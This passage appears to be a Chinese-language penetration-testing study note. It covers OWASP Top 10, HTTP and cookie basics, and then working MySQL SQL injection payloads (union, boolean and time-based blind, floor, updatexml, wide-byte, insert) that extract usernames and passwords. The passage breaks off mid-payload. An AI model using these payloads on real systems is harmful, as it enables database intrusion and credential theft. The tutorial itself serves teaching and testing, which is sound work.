        <content type="html"><![CDATA[<h1 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h1><blockquote><p><a href=".\5cfe0bd9">text::Web渗透工具</a></p></blockquote><hr><h2 id="〇、Web安全基础"><a href="#〇、Web安全基础" class="headerlink" title="〇、Web安全基础"></a>〇、Web安全基础</h2><h3 id="1-OWAPS"><a href="#1-OWAPS" class="headerlink" title="1 OWAPS"></a>1 OWAPS</h3><blockquote><p>OWAPS（Open Web Application Security Project，开放式Web应用程序安全项目）：提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息。</p><p><a href="http://www.owasp.org.cn/">official::OWAPS官网</a></p><p><a href="https://zhuanlan.zhihu.com/p/393635352">Top10</a></p></blockquote><ul><li>漏洞类型（2017年 Top10）<ol><li>注入：数据作为命令注入。</li><li>失效的身份认证：冒充身份。</li><li>敏感感数据泄露：数据泄露。</li><li>XML外部实体（XXE）：全称为XML External Entity attack 即XML(可扩展标记语言) 外部实体注入攻击。</li><li>失效的访问控制：未身份认证但获得了权限。</li><li>安全配置错误：不安全的配置。</li><li>跨站脚本（XSS）：脚本转义。</li><li>不安全的反序列化：反序列化。</li><li>使用含有已经漏洞的组件：漏洞利用。</li><li>不足的日志记录和监控：日志缺陷。</li></ol></li></ul><h3 id="2-http协议"><a href="#2-http协议" class="headerlink" title="2 http协议"></a>2 http协议</h3><ul><li><p>http协议主要用于传输 html 文本</p><blockquote><p>URL（统一资源定位符）是一种特殊的URI（统一资源标识符）。</p></blockquote></li><li><p>请求头</p><ul><li><p>Host</p></li><li><p>User-Agent</p></li><li><p>Accept</p></li><li><p>Accept-Language</p></li><li><p>Cookie</p><blockquote><p>一般，一个浏览器最多300个Cookie，每个domain最多20个Cookie，每个Cookie大小都小于4KB。</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">// 设置Cookie</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly</span><br><span class="line"></span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Strict</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Lax</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=None; Secure</span><br><span class="line"></span><br><span class="line">// 设置多种属性的案例：</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>Referer </li></ul><ul><li><p>响应头</p><ul><li>Location：控制浏览器重定向到哪个页面。</li><li>Server：服务器的 banner 信息。</li><li>Set-Cookie：服务器发送给客户端的 Cookie 设置信息。</li><li>Cache-Control：服务器控制浏览器是否要缓存网页。</li></ul></li><li><p>测试服务器开放的方法：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">telnet IP</span><br><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:IP</span><br></pre></td></tr></table></figure></li><li><p>测试PUT漏洞</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">telnet IP</span><br><span class="line"><span class="keyword">PUT</span> <span class="string">/input.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:IP</span><br><span class="line">Content-Length=6</span><br><span class="line"></span><br><span class="line">123456</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-Cookie与Session详解"><a href="#3-Cookie与Session详解" class="headerlink" title="3 Cookie与Session详解"></a>3 Cookie与Session详解</h3><ul><li><p>设置 Cookie</p><p><code>&lt;?php setcookie(&quot;user&quot; , &quot;value&quot; , time() + &lt;time&gt; )&gt;</code></p></li><li><p>获取 Cookie</p><p><code>&lt;?php print_r( $_COOKIE[ &quot;user&quot; ])</code></p></li><li><p>删除 Cookie</p><p><code>&lt;?php setcookie(&quot;user&quot; , &quot;value&quot; , time() - &lt;time&gt; )&gt;</code></p></li><li><p>Cookie解密</p><blockquote><p><a href="https://github.com/Magialeaf/Web/blob/main/Attack/Cookie解密.py">源码</a></p></blockquote></li><li><p>Session</p><blockquote><p>session信息存储在服务器端的数据库或者文件中。客户端请求服务器时都会带上Session信息，这样服务器就可以区分不同的客户端请求。</p><p>组成：Session id，Session file，Session data。</p></blockquote></li></ul><h3 id="4-其他相关知识"><a href="#4-其他相关知识" class="headerlink" title="4 其他相关知识"></a>4 其他相关知识</h3><ul><li><a href=".\Web渗透工具.md">Web渗透工具</a> </li><li><a href="..\..\Main\OS_Security\Kali Linux.md">Kali Linux</a> </li><li><a href="..\Web_Backend\PHP.md">PHP</a> </li></ul><hr><h2 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h2><h3 id="1-注入类型"><a href="#1-注入类型" class="headerlink" title="1 注入类型"></a>1 注入类型</h3><ul><li><p>数字型注入（通过返回结果判断）</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 测试流程</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; # 不正常返回</span></span><br><span class="line"><span class="string">id=1 and 1=1; # 正常返回</span></span><br><span class="line"><span class="string">id=1 and 1=2; # 不正常返回</span></span><br></pre></td></tr></table></figure></li><li><p>字符型注入（通过返回结果判断）</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 测试流程</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; # 不正常返回</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1; # 正常返回</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2; # 不正常返回</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1 or 1=1; # 表中所有数据将会被显示</span></span><br><span class="line"><span class="string">1&#x27;</span>#; # 会截断后面的 <span class="keyword">sql</span> 语句</span><br></pre></td></tr></table></figure></li><li><p>搜索型注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 原理：<span class="keyword">sql</span>语句中存在 变量 <span class="keyword">like</span> <span class="string">&#x27;%xx%&#x27;</span></span><br><span class="line"></span><br><span class="line"># 测试流程，任一不报错表示存在搜索型注入</span><br><span class="line"><span class="string">&#x27;and 1=1 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"><span class="operator">%</span><span class="string">&#x27; and 1=1--&#x27;</span>;</span><br><span class="line"><span class="operator">%</span><span class="string">&#x27; and 1=1 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>xx型注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 原理：<span class="keyword">sql</span>语句中存在 变量<span class="operator">=</span>(<span class="string">&#x27;xx&#x27;</span>) </span><br><span class="line"></span><br><span class="line"># 测试流程，不报错表示存在xx型注入</span><br><span class="line">x<span class="string">&#x27;) or 1=1 #;  </span></span><br></pre></td></tr></table></figure></li><li><p>报错注入：有报错返回的注入</p></li><li><p>盲注：无报错返回的注入</p></li></ul><h3 id="2-MySQL数据库"><a href="#2-MySQL数据库" class="headerlink" title="2 MySQL数据库"></a>2 MySQL数据库</h3><blockquote><p><a href="https://blog.csdn.net/Ajdidfj/article/details/123246593">部分函数</a></p></blockquote><h4 id="2-1-简单使用"><a href="#2-1-简单使用" class="headerlink" title="2.1 简单使用"></a>2.1 简单使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MYSQL——bin</span></span><br><span class="line">mysql -u &lt;user&gt; -p：登入</span><br><span class="line">登入后输入的命令要有 ; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 尾部加：%23（#），（--+）截断后面的命令</span></span><br></pre></td></tr></table></figure><h4 id="2-2-联合注入"><a href="#2-2-联合注入" class="headerlink" title="2.2 联合注入"></a>2.2 联合注入</h4><ul><li><p>系统表</p><blockquote><p>MySQL自带 information_schema 数据库，他提供了访问数据库元数据的方式。（元数据是数据的数据，如数据库名或表名、列的数据类型或访问权限等）    </p></blockquote><ul><li><p>SCHEMATA表</p><blockquote><p>提供了当前 MySQL 实例中所有数据库的信息。（show database结果取自此表）</p><p>information_schema.CHEMATA可查：schema_name</p></blockquote></li><li><p>TABLES表</p><blockquote><p>提供了关于数据库中表（视图）的信息（表属于那个 schema、表类型、表引擎、创建时间等）。（show tables from “schema_name”）</p><p>information_schema.tables可查：table_schema，table_name</p></blockquote></li><li><p>COLUMNS表</p><blockquote><p>提供了表中的列信息（某个表的所有列以及每个列的信息）。（show columns from “schema_name.table_name”）</p><p>information_schema.columns可查：table_schema，table_name，column_name</p></blockquote></li></ul></li><li><p>union联合注入</p><blockquote><p>union ：联合注入（两个select结果格式应一致，union查询出多条会只保留一条）</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、判断注入点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"># 数字型还是字符型</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、判断列数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line"># 表示依照第一列排序，依此可以判断有多少列</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、判断报错点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"># 获得报错列，将<span class="keyword">sql</span>语句放到报错列上</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、获取当前数据库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,CONCAT_WS(<span class="type">CHAR</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),database(),version()),<span class="number">3</span></span><br><span class="line"># <span class="keyword">user</span>()：当前用户名，database()：当前数据库名，version()：当前版本，concat_ws()：指定分隔符拼接（参数一是分隔符）</span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、获取数据库中表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span></span><br><span class="line"># group_concat( [<span class="keyword">distinct</span>] 要连接的字段 [<span class="keyword">order</span> <span class="keyword">by</span> 排序字段 <span class="keyword">asc</span><span class="operator">/</span><span class="keyword">desc</span> ] [separator <span class="string">&#x27;分隔符&#x27;</span>] )</span><br><span class="line"></span><br><span class="line"># <span class="number">6</span>、获取表中列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span></span><br><span class="line"># 同理</span><br><span class="line"></span><br><span class="line"># <span class="number">7</span>、获取列中数据</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,<span class="string">&#x27; &#x27;</span>,password),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"># 同理</span><br></pre></td></tr></table></figure></li><li><p>常用函数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 从n开始，输出m个结果</span><br><span class="line">limit n,m</span><br><span class="line"><span class="keyword">user</span>()</span><br><span class="line"><span class="built_in">current_user</span>()</span><br><span class="line">database()</span><br><span class="line">version()</span><br><span class="line">length()</span><br><span class="line">hex()</span><br><span class="line"></span><br><span class="line"># 数据库路径</span><br><span class="line">@<span class="variable">@datadir</span></span><br><span class="line"># 数据库系统版本</span><br><span class="line">@<span class="variable">@version_compile_os</span></span><br><span class="line"># 写文件</span><br><span class="line">into_dumpfile()</span><br><span class="line"># 读文件</span><br><span class="line">load_file()</span><br><span class="line"># 拼接字符串</span><br><span class="line">concat(str,str)</span><br><span class="line"># 将<span class="keyword">group</span> <span class="keyword">by</span>产生的同一个分组中的值连接起来，返回一个字符串结果，用法如上。</span><br><span class="line">group_concat()</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-布尔盲注"><a href="#2-3-布尔盲注" class="headerlink" title="2.3 布尔盲注"></a>2.3 布尔盲注</h4><ul><li><p>布尔盲注</p><blockquote><p>依照返回结果是 true 或 false 来进行注入。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、数据库长度</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(database())) <span class="operator">&gt;</span> num</span><br><span class="line"># 修改num值和大于符号，试出长度</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、库名（参数<span class="number">2</span>从<span class="number">1</span>开始）</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># 改substring参数二，num和符号，逐步试出库名</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii (<span class="built_in">substring</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27; name &#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># 改substring参数二，num和符号，逐步试出库名。limit是限制输出第一个表，如果有多个表要改第一个参数</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii (<span class="built_in">substring</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27; name &#x27;</span> <span class="keyword">and</span> table_schema <span class="operator">=</span> <span class="string">&#x27; name &#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># 同理步骤 <span class="number">3</span></span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="operator">&lt;</span>schema<span class="operator">&gt;</span>.<span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># <span class="operator">&lt;</span>schema<span class="operator">&gt;</span>.<span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span>：填库名和表名</span><br></pre></td></tr></table></figure></li><li><p>相关函数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 长度</span><br><span class="line">length(str)</span><br><span class="line"># 对str从第m字符开始向后截取n个字符（<span class="number">1</span>开始计数）</span><br><span class="line"><span class="built_in">substring</span>(str,m,n)</span><br><span class="line"># c 的 ascii 码</span><br><span class="line">ascii(c)</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-4-时间盲注"><a href="#2-4-时间盲注" class="headerlink" title="2.4 时间盲注"></a>2.4 时间盲注</h4><ul><li><p>时间盲注</p><blockquote><p>注入无返回结果或唯一返回结果时使用，依照睡眠时间判断为真还是为假。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、数据库长度</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep (if(length((<span class="keyword">select</span> database()))<span class="operator">=</span><span class="number">10</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试出长度</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">116</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">101</span>,<span class="number">0</span>,<span class="number">5</span>)))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">101</span>,<span class="number">0</span>,<span class="number">5</span>)))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> username <span class="keyword">from</span><span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span>.<span class="operator">&lt;</span><span class="keyword">column</span><span class="operator">&gt;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">69</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br></pre></td></tr></table></figure></li><li><p>相关函数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 睡眠</span><br><span class="line">sleep(<span class="type">time</span>)</span><br><span class="line"># 三木运算符，条件，为真，为假。</span><br><span class="line">if(<span class="keyword">condition</span>,<span class="literal">true</span>,<span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-5-floor盲注"><a href="#2-5-floor盲注" class="headerlink" title="2.5 floor盲注"></a>2.5 floor盲注</h4><ul><li><p>floor盲注</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 改变 limit 的第一个值来获得不同的库名，表名，列名</span><br><span class="line"># <span class="number">1</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ( <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat (database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ( <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="built_in">floor</span>( rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></li><li><p>相关函数</p><blockquote><p>原理：floor 注入是 rand 函数在与 group by 子句一起使用时多次计算导致的。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 返回不大于 x 的整数值</span><br><span class="line"><span class="built_in">floor</span>(x)</span><br><span class="line"># (<span class="number">0</span>,<span class="number">1</span>)的随机数（rand() <span class="operator">*</span> <span class="number">2</span> ∈ (<span class="number">0</span>,<span class="number">2</span>)）（用rand(<span class="number">0</span>)保证注入必报错）</span><br><span class="line">rand()</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-6-XML注入"><a href="#2-6-XML注入" class="headerlink" title="2.6 XML注入"></a>2.6 XML注入</h4><ul><li><p>updatexml注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database())),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li><li><p>相关函数</p><blockquote><p>原理：输入的路径不符合格式导致报错，在路径栏中返回报错信息。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 对XML文档进行更新</span><br><span class="line">updatexml( XML_document , XPath_string , new_value )</span><br><span class="line"># String型，是目标XML文档的文件格式。</span><br><span class="line">XML_document</span><br><span class="line"># （XPath格式的字符串）是XML文档路径。</span><br><span class="line">XPath_string</span><br><span class="line"># String型，用于替换查找到的符合条件的数据。</span><br><span class="line">new_value</span><br></pre></td></tr></table></figure></li><li><p>extractvalue注入</p><blockquote><p>同理于 updatexml，将 updataxml 改成 extractvalue 即可。</p></blockquote></li></ul><h4 id="2-7-宽字节注入"><a href="#2-7-宽字节注入" class="headerlink" title="2.7 宽字节注入"></a>2.7 宽字节注入</h4><ul><li><p>宽字节注入</p><blockquote><p>原理：限字符集包含中文，程序通过 addslashes 函数在引号前会加入 \ ，然后会和前面的编码拼成一个宽字节，引号不会被转义，语句闭合导致注入成功。</p><p>可以使用：%81，%df</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">81</span><span class="string">&#x27; and 1=2 union select 1,database(),3 %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2、表名</span></span><br><span class="line"><span class="string">id=1%81&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0</span>x<span class="operator">&lt;&gt;</span> <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">81</span><span class="string">&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x&lt;&gt; and table_name=0x&lt;&gt; %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4、值</span></span><br><span class="line"><span class="string">id=1%81&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username , <span class="number">0x2a2a2a</span> , password),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">user</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="2-8-增删改注入"><a href="#2-8-增删改注入" class="headerlink" title="2.8 增删改注入"></a>2.8 增删改注入</h4><ul><li><p>Insert</p><blockquote><p>SQL语句中因为insert语句为：<code>INSERT INTO table_name (col_1, col_2,...) VALUES (value_1, value_2,....)</code>。所以可以通过构造语句在value进行操作。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>猜闭合</span><br><span class="line">username<span class="operator">=</span>xixi<span class="string">&#x27;,&#x27;</span><span class="number">111</span><span class="string">&#x27;) #</span></span><br><span class="line"><span class="string"># 